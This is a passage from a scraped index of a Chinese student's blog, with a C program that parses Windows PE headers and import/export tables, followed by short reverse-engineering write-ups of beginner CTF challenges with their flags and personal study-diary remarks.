pNtHeader-\u0026gt;Signature);\n大部分以十六进制的方法输出，小部分需要看一下表示的内容于是便输出为%s或者是%d。\n注意，在文件映射的开始我们定义了一个PVOID的pbFile，这个代表文件的入口，之后我们想要定位NT头或者其他什么内容时需要用到。\ne_lfanew的值就是指从文件开头到NT头的距离，中间可能夹着DOS存根，但是无伤大雅，存根是只有在DOS环境下启动程序才会运行的内容，现在一般用来告诉用户这个软件应该在windows下打开。\n把注意力放在NT头上：\n通过强制类型转化可以找到NT头的起始位置，下面是NT头的内容:\nNT头看着没什么东西，里面其实包含了两个结构体，一个文件头一个可选头。\nNT头的第一个signature是签名，作为PE文件其值为0x50450000，也就是\u0026quot;PE\u0026quot;00\nprintf(\u0026quot;\\n==================================PE NT HEADER===================================\u0026quot;);//大小为F8\nPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pbFile + pDosHeader-\u0026gt;e_lfanew);\nprintf(\u0026quot;\\nSignature: 0x%08X\u0026quot;, pNtHeader-\u0026gt;Signature);\n文件头的结构如下：\n//NT头的file header\nprintf(\u0026quot;\\n==================================PE FILE HEADER===================================\\n\u0026quot;);\nprintf(\u0026ldquo;Machine: 0x%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.Machine);\nprintf(\u0026ldquo;NumberOfSections: 0x%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.NumberOfSections); //文件中存在的节区数量\nprintf(\u0026ldquo;TimeDateStamp: 0x%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.TimeDateStamp);\nprintf(\u0026ldquo;PointerToSymbolTable: 0x%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.PointerToSymbolTable);\nprintf(\u0026ldquo;NumberOfSymbols: 0x%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.NumberOfSymbols);\nprintf(\u0026ldquo;SizeOfOptionalHeader: 0x%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.SizeOfOptionalHeader); //指出optional header 的大小\nprintf(\u0026ldquo;Characteristics: 0x%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;FileHeader.Characteristics); //标识文件的属性\n可选头结构如下：\n//NT头的optional header\nprintf(\u0026quot;\\n===================================PE OPTIONAL HEADER====================================\\n\u0026quot;);\nprintf(\u0026ldquo;Machine:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.Magic); printf(\u0026ldquo;MajorLinkerVersion:%02X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MajorLinkerVersion);\nprintf(\u0026ldquo;MinorLinkerVersion:%02X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MinorLinkerVersion);\nprintf(\u0026ldquo;SizeOfCode:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfCode);\nprintf(\u0026ldquo;SizeOfInitializedData:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfInitializedData);\nprintf(\u0026ldquo;SizeOfUninitializedData:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfUninitializedData);\nprintf(\u0026ldquo;AddressOfEntryPoint:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.AddressOfEntryPoint); //代码起始位置\nprintf(\u0026ldquo;BaseOfCode:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.BaseOfCode);\nprintf(\u0026ldquo;BaseOfData:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.BaseOfData);\nprintf(\u0026ldquo;ImageBase:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.ImageBase);\nprintf(\u0026ldquo;SectionAlignment:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SectionAlignment);\nprintf(\u0026ldquo;FileAlignment:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.FileAlignment);\nprintf(\u0026ldquo;MajorOperatingSystemVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MajorOperatingSystemVersion);\nprintf(\u0026ldquo;MinorOperatingSystemVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MinorOperatingSystemVersion);\nprintf(\u0026ldquo;MajorImageVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MajorImageVersion);\nprintf(\u0026ldquo;MinorImageVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MinorImageVersion);\nprintf(\u0026ldquo;MajorSubsystemVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MajorSubsystemVersion);\nprintf(\u0026ldquo;MinorSubsystemVersion:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.MinorSubsystemVersion);\nprintf(\u0026ldquo;Win32VersionValue:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.Win32VersionValue);\nprintf(\u0026ldquo;SizeOfImage:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfImage);\nprintf(\u0026ldquo;SizeOfHeaders:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfHeaders); //整个PE头大小\nprintf(\u0026ldquo;CheckSum:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.CheckSum);\nprintf(\u0026ldquo;Subsystem:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.Subsystem);\nprintf(\u0026ldquo;DllCharacteristics:%04X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.DllCharacteristics);\nprintf(\u0026ldquo;SizeOfStackReserve:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfStackReserve);\nprintf(\u0026ldquo;SizeOfStackCommit:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfStackCommit);\nprintf(\u0026ldquo;SizeOfHeapReserve:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfHeapReserve);\nprintf(\u0026ldquo;SizeOfHeapCommit:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.SizeOfHeapCommit);\nprintf(\u0026ldquo;LoaderFlags:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.LoaderFlags);\nprintf(\u0026ldquo;NumberOfRvaAndSizes:%08X\\n\u0026rdquo;, pNtHeader-\u0026gt;OptionalHeader.NumberOfRvaAndSizes); //用来指定最后数组的大小\nchar DataDirectoryName[][50] = { \u0026ldquo;EXPORT Directory\u0026rdquo;,\u0026ldquo;IMPORT Directory\u0026rdquo;,\u0026ldquo;RESOURCE Directory\u0026rdquo;,\u0026ldquo;EXCEPTION Directory\u0026rdquo;,\u0026ldquo;SECURITY Directory\u0026rdquo;,\u0026ldquo;BASERELOC Directory\u0026rdquo;,\n\u0026ldquo;DEBUG Directory\u0026rdquo;,\u0026ldquo;COPYRIGHT Directory\u0026rdquo;,\u0026ldquo;GLOBALPTR Directory\u0026rdquo;,\u0026ldquo;TLS Directory\u0026rdquo;,\u0026ldquo;LOAD_CONFIG Directory\u0026rdquo;,\u0026ldquo;BOUND_IMPORT Directory\u0026rdquo;,\u0026ldquo;IAT Directory\u0026rdquo;,\u0026ldquo;DELAY_IMPORT Directory\u0026rdquo;,\n\u0026ldquo;COM_DESCRIPTOR Directory\u0026rdquo;,\u0026ldquo;Reserved Directory\u0026rdquo; };\nfor (int i = 0; i \u0026lt; pNtHeader-\u0026gt;OptionalHeader.NumberOfRvaAndSizes; i++) {\nprintf(\u0026quot;%s : 0x%08X 0x%08X\\n\u0026quot;, DataDirectoryName[i], pNtHeader-\u0026gt;OptionalHeader.DataDirectory[i].VirtualAddress,pNtHeader-\u0026gt;OptionalHeader.DataDirectory[i].Size);\n}\n节区表：\nprintf(\u0026quot;\\n===================================PE SECTION HEADER====================================\\n\\n\u0026quot;);\n//PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);\nPIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeader + sizeof(IMAGE_NT_HEADERS));\nfor (int i = 0; i \u0026lt; pNtHeader-\u0026gt;FileHeader.NumberOfSections; i++) {\nprintf(\u0026quot;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;stction %d\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;\\n\\n\u0026quot;,i+1);\nfor (int j = 0; j \u0026lt; IMAGE_SIZEOF_SHORT_NAME; j++) {\nprintf(\u0026quot;%c\u0026quot;, pSectionHeader-\u0026gt;Name[j]);\n}//name的名称可能和实际作用没什么联系\nprintf(\u0026quot; 0x\u0026quot;);\nfor (int j = 0; j \u0026lt; IMAGE_SIZEOF_SHORT_NAME; j++) {\nprintf(\u0026quot;%X\u0026quot;, pSectionHeader-\u0026gt;Name[j]);\n}\nprintf(\u0026quot;\\nVirtualSize : 0x%04X\u0026quot;, pSectionHeader-\u0026gt;Misc.VirtualSize); //内存中节区所占大小\nprintf(\u0026quot;\\nVirtualAddress : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;VirtualAddress); //内存中节区起始地址\nprintf(\u0026quot;\\nSizeOfRawData : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;SizeOfRawData); //磁盘文件节区所占大小\nprintf(\u0026quot;\\nPointerToRawData : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;PointerToRawData); //磁盘文件中节区起始位置\nprintf(\u0026quot;\\nPointerToRelocations : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;PointerToRelocations);\nprintf(\u0026quot;\\nPointerToLinenumbers : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;PointerToLinenumbers);\nprintf(\u0026quot;\\nNumberOfRelocations : 0x%04X\u0026quot;, pSectionHeader-\u0026gt;NumberOfRelocations);\nprintf(\u0026quot;\\nNumberOfLinenumbers : 0x%04X\u0026quot;, pSectionHeader-\u0026gt;NumberOfLinenumbers);\nprintf(\u0026quot;\\nCharacteristics : 0x%08X\u0026quot;, pSectionHeader-\u0026gt;Characteristics);\npSectionHeader++;\nprintf(\u0026quot;\\n\\n\u0026quot;);\n}\n输入表：\nprintf(\u0026quot;\\n===================================PE IMPORT====================================\\n\u0026quot;);\nDWORD pImportOffset = RVA_to_RAW(pNtHeader,pNtHeader-\u0026gt;OptionalHeader.DataDirectory[1].VirtualAddress);\nPIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pbFile + pImportOffset);\nwhile (1) {\nif (pImport-\u0026gt;FirstThunk == 0 \u0026amp;\u0026amp; pImport-\u0026gt;ForwarderChain == 0 \u0026amp;\u0026amp; pImport-\u0026gt;Name == 0 \u0026amp;\u0026amp; pImport-\u0026gt;OriginalFirstThunk == 0 \u0026amp;\u0026amp; pImport-\u0026gt;TimeDateStamp == 0) {\nbreak ;\n}\nDWORD dwINT = (DWORD)pbFile + RVA_to_RAW(pNtHeader, pImport-\u0026gt;OriginalFirstThunk);\nDWORD dwTimeDateStamp = (DWORD)pbFile + RVA_to_RAW(pNtHeader, pImport-\u0026gt;TimeDateStamp);\nDWORD dwForwarderChain = (DWORD)pbFile + RVA_to_RAW(pNtHeader, pImport-\u0026gt;ForwarderChain);\nDWORD dwName = (DWORD)pbFile + RVA_to_RAW(pNtHeader, pImport-\u0026gt;Name);\nDWORD dwFirstThunk = (DWORD)pbFile + RVA_to_RAW(pNtHeader, pImport-\u0026gt;FirstThunk);\nprintf(\u0026quot;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;- %s \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-\\n\u0026quot;,dwName);\nprintf(\u0026ldquo;TimeDateStamp: 0x%08X\\n\u0026rdquo;, pImport-\u0026gt;TimeDateStamp);\nprintf(\u0026ldquo;ForwarderChain: 0x%08X\\n\u0026rdquo;, pImport-\u0026gt;ForwarderChain);\nprintf(\u0026ldquo;pImport-\u0026gt;FirstThunk: 0x%X\\n\u0026rdquo;, pImport-\u0026gt;FirstThunk);\nDWORD * ImportByName = (DWORD *)dwINT;\nDWORD * pFirstThunk = (DWORD *)dwFirstThunk;\nint i = 0;\nprintf(\u0026quot;\\nAddress\\t\\tHint\\tName\\n\u0026quot;);\nwhile ((ImportByName[i])) {\nPIMAGE_IMPORT_BY_NAME pImpoetByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pbFile + RVA_to_RAW(pNtHeader, ImportByName[i]));\nprintf(\u0026ldquo;0x%04X\\t\u0026rdquo;, pFirstThunk[i]);\nprintf(\u0026ldquo;0x%04X\\t\u0026rdquo;,pImpoetByName-\u0026gt;Hint);\nprintf(\u0026quot;%s\\n\u0026quot;, pImpoetByName-\u0026gt;Name);\ni++;\n}\ndwINT++;\npImport++;\n}\n输出表：\nprintf(\u0026quot;\\n===================================PE EXPORT====================================\\n\u0026quot;);\nPIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pNtHeader-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress));\nprintf(\u0026ldquo;Characteristics : 0x%X\\n\u0026rdquo;, pExport-\u0026gt;Characteristics);\nprintf(\u0026ldquo;TimeDateStamp : 0x%X\\n\u0026rdquo;, pExport-\u0026gt;TimeDateStamp);\nprintf(\u0026ldquo;MajorVersion : 0x%X\\n\u0026rdquo;, pExport-\u0026gt;MajorVersion);\nprintf(\u0026ldquo;MinorVersion : 0x%X\\n\u0026rdquo;, pExport-\u0026gt;MinorVersion);\nprintf(\u0026ldquo;Base : 0x%X\\n\u0026rdquo;, pExport-\u0026gt;Base);\nprintf(\u0026ldquo;NumberOfNames: %d\\n\u0026rdquo;, pExport-\u0026gt;NumberOfNames);\nprintf(\u0026ldquo;NumberOfFunctions: %d\\n\u0026rdquo;, pExport-\u0026gt;NumberOfFunctions);\nDWORD * AddressOfFunctions = (DWORD *)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pExport-\u0026gt;AddressOfFunctions));\nDWORD * AddressOfNameOrdinals = (DWORD *)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pExport-\u0026gt;AddressOfNameOrdinals));\nDWORD * AddressOfNames = (DWORD *)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pExport-\u0026gt;AddressOfNames));\nDWORD * Name = (DWORD *)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pExport-\u0026gt;Name));\nWORD * pwOrdinals = (WORD *)((DWORD)pbFile + RVA_to_RAW(pNtHeader, pExport-\u0026gt;AddressOfNameOrdinals));\nif (pExport-\u0026gt;NumberOfFunctions == 0) { printf(\u0026quot;\\n\\t\u0026mdash;\u0026mdash;\u0026mdash;- No Export Tabel! \u0026mdash;\u0026mdash;\u0026mdash;-\\n\u0026quot;);\nif (NULL != pbFile)\n{\nUnmapViewOfFile(pbFile);\n}\nif (NULL != hMapping) {\nCloseHandle(hMapping);\n}\nif (INVALID_HANDLE_VALUE != hFile) {\nCloseHandle(hFile);\n}\nreturn 0; }\nfor (int i = 0; i \u0026lt; pExport-\u0026gt;NumberOfNames; i++) { DWORD dwName = (DWORD)pbFile + RVA_to_RAW(pNtHeader, AddressOfNames[i]);\nDWORD VA = pNtHeader-\u0026gt;OptionalHeader.ImageBase + AddressOfFunctions[i];\nprintf(\u0026ldquo;Ordinals: %d\\tName: %-30s\\tRVA: 0x%08X\\tVA: 0x%08X\\n\u0026rdquo;, pwOrdinals[i], dwName, AddressOfFunctions[i], VA);\n}\n在输入输出表这里遇到了新的问题：在知晓如何把RVA转化成RAW之后，要再次以新的RAW和起始地址找新的结构，这个时候利用了指针指向把数据输出，我一直输出的是指针存放的地址，所以非常难受。\n整个代码已经上传至github和gitee：\nGithub：https://github.com/DorinXL/Easy_PEInfo\nGitee： https://gitee.com/dorinxl/Easy_PEInfo\n","date":"2020-07-23T10:43:00Z","permalink":"https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/","title":"C语言的PELode编写记录"},{"content":"\n最近心烦意乱的，好几天没刷题。\n大物老师也不讲题，自习是吧，BUU上找个题找找感觉好了。\nGO语言写的，随便点点：\n点出来flag了：\nflag{hello_world_gogogo}\n行吧题都水完了，我还想bb两句。（把博客当日记估计只有我了）\n到期末复习的时候了，结果高数大物还得从头学（谢谢猴博士救我狗命）\n考试形式咱也不知道。C++又要自己写个什么系统，还要每个人网上答辩，好麻烦。\n六月比赛好多，七月也是。还要复习。\n自愿返校当然是不回去，那么远的路去一趟不是白花钱么。\n报了个什么比赛提交作品被out了，另一队晋级了，感觉自己好废。\n最近自学数据结构，然后为了加强动态调试的能力还开始攻读《逆向工程核心原理》\n好几天没更博客我真的没在玩。\n见的越多越觉得自己啥也不会。真的什么也不会了，学了半年逆向没什么大的突破。\n考虑闭关学习知识，但是还有考试，好几把烦。\n暑假还得练驾照，根本不想碰车，我吐了。\n活得真难，那咋办嘛。\n","date":"2020-06-09T02:59:00Z","permalink":"https://dorinxl.github.io/p/mrctf2020hello_world_go/","title":"【MRCTF2020】hello_world_go"},{"content":"\n这是一道当时比赛没做出来的题，沉迷口袋妖怪。\n没做出来是因为看着这花里胡哨的IDA就不想做了【不是】\n事后冷静分析一波，挺多干扰的。\n简单来讲就是输入之后进行处理然后对比。IDA反编译出来的语句太迷了看的我头都大了。\n↑这个是处理输入位数的，要16位。\n↑这个是对输入的字符出进行处理，这个for可有点东西，以下是我个人理解：\n首先取值i，i的范围是0-v8，v8一开始是0，通过下面的v9语句进行自增，也就是说这个i的范围是数组v12从开始到某个值的一段。(对那个sub_411325其实是返回数组内容)\n这个值的判断标准就是中间的 *i \u0026lt; *v11,也就是说，把所有v12数组中小于v11的值取出来累加得到v9，再和v11异或保存。而v11恰好就是我们输入的字符串，也就是flag。\n那么现在有个问题，我们知道v11是输入，那v12是啥？\n寻找最先出现v12的位置，sub_4112F8：\n那个判断条件是这样的：\n如果是质数，那么保存。\n如此一来我们就可以知道，整个算法是将1-128的质数保存在数组，然后依次遍历每个flag的字符，将比字符小的质数累加的和与该字符异或，最后对比：\nC代码：\n有一说一，我是真的看着这些个sub函数顶的不行，还是见识太少。\n","date":"2020-05-31T10:55:00Z","permalink":"https://dorinxl.github.io/p/gkctf2020chellys-identity/","title":"【GKCTF2020】Chelly’s identity"},{"content":"\nFlare-on第六届挑战赛的题，\n挺迷的，这个挑战赛的题都挺有水平。\nIDA打开就仨函数：\nMain函数也挺简单：\n对v4处理，存到text，输出，没了。\n然而疑惑的地方是，v4有这么长：\n（比这个还长）\n但是这里指处理了28，即0x1C的长度。\n结合他运行时跑出的数据：\n数了数算上空格正好是这么长，我有理由怀疑他没有处理后面的字符。\n所以我们要做的就是把处理长度从0x1C延长到整个长度，数了数是0xAF个字符。\n从：到\nB6 – 08 + 1= B8 – 08 - 1 = B0 – 1 = AF\n所以我下意识打开OD去改数据。\n为什么不用IDA改？因为我改了之后不会保存成二进制文件。\n然鹅打开OD之后我发现，根本找不到这段数据，好像直接进入dll了：\n然后我想了想，怎么修改呢？\n文件的本质就是二进制啊！那我直接找个十六进制修改器，找到对应的机器码不就行了：\n这里本来是6A 1C 68 ，改成了6A AF 68，再次运行：\n（其实也可以按照程序逻辑写一遍代码，但是我觉得太麻烦了）\n","date":"2020-05-30T10:33:00Z","permalink":"https://dorinxl.github.io/p/flareon6overlong/","title":"【FlareOn6】Overlong"},{"content":"\n武科大re第五题，无壳：\n拖进IDA，看到了关键词【数据结构】，还有关键函数，大致猜了一下估计是遍历树，kali跑一跑看看\n果然，第一行和第二行第一个都是2，那估计是后序和中序的遍历。联想前面做的题都是wctf开头的，可以推出来第二行是后序，因为后序最后一个字母是根节点。\n手动算前序，其中有两个下划线连在一起了，于是我把那一枝分别写了出来（但是问题不大）：\nwctf2020{This_IS_A_7reE}\n","date":"2020-05-28T13:17:00Z","permalink":"https://dorinxl.github.io/p/wustctf2020level4/","title":"【WUSTCTF2020】level4"},{"content":"\n查壳：\n无壳，扔进IDA：\n看到关键数据，base64转一下试试：\n有点flag那味了，估计这是把base64表给改了，那么就需要找一下修改的函数，在函数列表找到一个O_OloolAtYou()函数，看起来有些可疑，果不其然：\n其实也可以交叉引用找到这个函数：\n这个函数主要作用呢，我们跑一下就可以知道是把A-T给调了个顺序：\n于是我们就把他反过来跑一下：\n得到：d2N0ZjIwMjB7QmFzZTY0X2lzX3RoZV9zdGFydF9vZl9yZXZlcnNlfQ==\nwctf2020{Base64_is_the_start_of_reverse}\n吃饭去了，一会还要上课，本来说把c++大作业给写了的，一不小心有做了俩题，水了一波分数，溜了溜了；\n","date":"2020-05-25T10:45:00Z","permalink":"https://dorinxl.github.io/p/wustctf2020level3/","title":"【WUSTCTF2020】level3"},{"content":"\n顺着前两个题我直接顺藤摸瓜摸到了武汉科技大学这一届的ctf，干脆全做了吧，看上去也不难，非常友好：\n经典无壳：\n扔进IDA发现也是判断一下输入就可，里面的判断函数甚是粗暴：\n每个函数的名字还挺有意思，三下五除二写个cpp：\nwctf2020{cpp_@nd_r3verse_@re_fun}\n","date":"2020-05-25T10:05:00Z","permalink":"https://dorinxl.github.io/p/wustctf2020cr0ssfun/","title":"【WUSTCTF2020】Cr0ssfun"},{"content":"\n一个UPX加壳题：\nElf直接upx -d脱壳：\n然后扔进IDA，刚打开就看到flag了：\n那我不脱壳直接用txt打开也能找到咯？\n确实：wctf2020{Just_upx_-d}\n仅仅是upx -d\n","date":"2020-05-25T09:48:00Z","permalink":"https://dorinxl.github.io/p/wustctf2020level2/","title":"【WUSTCTF2020】level2"},{"content":"\n切一道简单题，下载下来是elf和txt：\nIda打开看逻辑：\n按下标，奇数把输入左移下标数值位数，偶数下标把输入乘下标：\nctf2020{d9-dE6-20c}\n","date":"2020-05-25T08:32:00Z","permalink":"https://dorinxl.github.io/p/wustctf2020level1/","title":"【WUSTCTF2020】level1"},{"content":"在参加网鼎杯之前，还没接触过vm指令的题，姑且是在网上找到好多，接下来几天慢慢做，看看能不能整理到一起。\n打开看着还挺简单的，一点进vm_operad人就傻了。\n里面是各种操作，太长了就不截图了，我还没学会怎么在word文档里贴代码（对我都是word文档写好之后上传博客的）\n这里想说一下我对vm虚拟机这类题的理解。\n看起来好像是题目给出一串opcode，然后通关循环switch判断opcode的数，找到对应的操作。\n这群opcode里面可以既有代表某一操作的指令，也有需要操作的数据。\n我们需要做的就是找到操作的顺序和操作的数据，把他们逆着跑一边。\n这里我参考了网上的各种wp，可以手算，可以直接列出步骤机器算，也可以更加只能一点，重写逻辑顺序，我们一个一个来。\n第一步，我们要找到程序流程：\n用IDA扒下来opcode，但是里面夹杂着一堆零，我不知道怎么去除。于是我的第一步就是把这些零清除，然后输出：\n10, 4, 16, 8, 3, 5, 1, 4, 32, 8, 5, 3, 1, 3, 2, 8, 11, 1, 12, 8, 4, 4, 1, 5, 3, 8, 3, 33, 1, 11, 8, 11, 1, 4, 9, 8, 3, 32, 1, 2, 81, 8, 4, 36, 1, 12, 8, 11, 1, 5, 2, 8, 2, 37, 1, 2, 54, 8, 4, 65, 1, 2, 32, 8, 5, 1, 1, 5, 3, 8, 2, 37, 1, 4, 9, 8, 3, 32, 1, 2, 65, 8, 12, 1, 7, 34, 7, 63, 7, 52, 7, 50, 7, 114, 7, 51, 7, 24, 7, 167, 7, 49, 7, 241, 7, 40, 7, 132, 7, 193, 7, 30, 7, 122, 114\n先不用管他这些数都是干什么的，我们把操作流程扒下来就好。\n下面我们才需要看一下程序逻辑，找到几个关键的点：\n当操作码是1的时候，就是向v4数组存入数值。\n当操作码是2-5或者11-12的时候，就是对数据进行运算，然后保存。这里面的v5和v3都是临时存放数据用的。\n当操作码是7的时候，其实是该对比处理过的flag了，源代码我给删了。\n操作码6是跳到下一位。\n操作码8是存储临时值，以便下次运算。\n这样一来，我把所有的操作过程的代码都删掉，只输出操作码，加上自己的标志，每次以1为结尾。因为1是存储flag然后接着处理下一个数了：\n这样一来我们也就知道，操作码7后面跟着的正是需要对比的数据，也是处理flag之后得到的数据。\n{0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a};\n第二步，逆向处理：\n先将操作码重写：\n然后将每种操作码对应的操作逆向，以2-5为例：\n需要注意的是，并不是完全的逆向流程，虽然我们将操作码的顺序反过来了，但是这里的步骤并不需要完全反过来求。\n不过这次是以v5和v4作为中介存储数据，v3存放flag：\n这里要注意一点，char类型会溢出，所以我加了一点措施，将（char+256）再%256，防止溢出成负数运算。\n（这就去看看怎么粘代码）\n（算了还是太懒，有人想要的话私聊吧）\n总之是可以运算出结果了：\n15是长度不要在意。\n还有一种做法，直接计算：\n这样来的十分之快，但是实用性不高，比赛的时候甚至可以手算，但是做题的话还是自动化吧。\n","date":"2020-05-24T12:21:00Z","permalink":"https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/","title":"【网鼎杯青龙组】signal"},{"content":"\n随便水一道签到题：\n没有壳，静态分析：\n输入flag，处理判断得出结果。\n很简单，程序逻辑是将输入的flag按照以dword_40F040数组的内容作为下标保存在byte数组中，然后异或处理，对比判断。反着写：\nRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}\nbb两句：\n昨天和前天好像没更新，去打安恒月赛xBJDCTF3th了，然而并没有做出来几个题。\n然后中间就开始研究青龙组那个虚拟机的题，好像安恒月赛也出了个，随后放一下青龙组那个signal的wp，第一次做有够麻烦的。\n对了今天早上的人生高光时刻：\n虽然仅仅在第一呆了几分钟但我也是值了。\n一会写完那个signal的wp就出去骑个十公里歇会。\n","date":"2020-05-24T08:33:00Z","permalink":"https://dorinxl.github.io/p/mrctf2020transform/","title":"【MRCTF2020】Transform"},{"content":"\n下载是exe文件，运行一下：\n很简单，依旧是输入-处理-判断。\n查壳：\n没壳，扔进IDA：\n只有一处判断，将其范围内的字符处理后对比。\n很简单，我一开始的思路是精准打击，找出被处理的字符串的ascii范围，写了一半感觉有点麻烦，不如直接爆破：\n就硬对应：\nCae3ar_th4_Gre@t\n最后bb两句：\n521我也在勤勉的做题啊！（懒狗，水博客还好意思说）\n现在上着选修，讲的是算法竞赛的知识。还是年少轻狂觉得自己可以驾驭这种比赛。其实已经没有在听了。\n了解了一下自由选修挂科的后果，好像除了白上一学期没别的了。白上就白上吧，实在不合适。只要不影响我的总成绩就好。\n","date":"2020-05-21T13:12:00Z","permalink":"https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/","title":"【ACTF新生赛2020】rome"},{"content":"\n查壳：\n没壳，跑一下看看：\n经典输入处理判断，扔进IDA看一看：\n框架比较简单，但是简单的框架内容可不一定简单。\n一些API函数，念着英文就知道什么意思了。看一下读取数据的函数：\n中规中矩的，把读入的\u0026rsquo;\\n\u0026rsquo;和\u0026rsquo;\\r\u0026rsquo;过滤一下。\n看一下处理和判断的函数：\n大体逻辑是这样的：\nv0是长度，v4是一个给定的数值。循环处理flag，将其倒序与v4亦或的结果保存，替换v4内容，继续下一位。\n由于结果已经给出了，我们要做的就是逆向写一遍这个算法。但是我们缺少v4的内容，不知道v4就不知道其他位置的flag。\n关于v4的这个函数sub_401000，我们不能立马得到结果：\n这是一个没见过的函数，具体处理也不是很懂。\n这里其实可以用od看一下运算结果，但是我用不熟od，好歹拖进去看一下：\n这里调用了401000函数，然后把al存了起来。\n手动计算401000：\nEax和edx存入0x80070057。Ax异或，eax左移4，ax右移1。\n这里注意eax是32位而ax是16位，ax取0x0057，rol循环左移不舍弃，shr右移舍弃高位0补足。得到的结果是0x0x700004\n然后al是8位，也就是04，所以v4 = 4；（老实说我并不明白这里为什么v4就是al的值）\n逆向算法：\n结果：\nR_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com\n","date":"2020-05-20T09:31:00Z","permalink":"https://dorinxl.github.io/p/flareon4igniteme/","title":"【FlareOn4】IgniteMe"},{"content":"\n下载下来，exe扔进去看看有没有壳：\n没有，运行一下看看是干啥的：\n很普通的界面，输入flag。\n扔进IDA分析一波：\nmain函数主体也比较简单，输入\u0026mdash;-处理\u0026mdash;-判断。\n我们进入sub_401080看看，这个函数是将我们输入的v10进行加密，然后存到v5里面。\n加密主体跟base64差不多，但是注意这里有两个函数，第一个函数：\n这个函数是将base64表处理。就是一个交换位置的函数。他将整个表分成了地址相连的两个数组。把两个数组的第6-14位进行交换。\n交换完毕后是这个样子：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/\n最后这里还有另一个函数：\n这个函数是大小写转换：\n把原数据zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9转化成：\nZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9\n那么我们倒退一下，因为base64是将3个8位数据转化成4个6位数据，我们不考虑过程，只看结果即可，将被交换的18个字母代入进去：\nZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9\nZmxhZ3tiQXNlNjRfaDJzX2FfU3VycHJpc2V9\n找个在线网站解密一下：\n最后bb两句：\n不学py真的不行了，c语言实现一些功能有些麻烦，需要这种更高效的语言了。\n5pqX5oGL5LqG5Zub5bm055qE5L